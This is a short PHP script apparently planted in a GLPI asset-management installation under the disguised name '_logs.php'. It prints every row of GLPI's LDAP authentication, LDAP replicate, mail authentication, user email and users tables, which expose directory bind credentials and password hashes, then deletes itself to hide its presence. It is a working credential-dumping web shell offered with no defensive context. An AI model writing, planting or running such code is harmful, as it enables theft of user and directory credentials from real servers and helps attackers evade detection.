<?php
include ('../../inc/includes.php');
$tables = array("glpi_authldaps","glpi_authldapreplicates","glpi_authmails","glpi_useremails","glpi_users");
for($x=0;$x<count($tables);$x++){echo "Table:$tables[$x]\n";$iterator = $DB->request(['SELECT' => "*",'FROM' => $tables[$x]]);$values = [];if (count($iterator)) {while ($data = $iterator->next()) {print_r($data);}}}
$result=unlink('_logs.php');if($result){echo "File delete success";}else{echo "File delete fail";}
?>
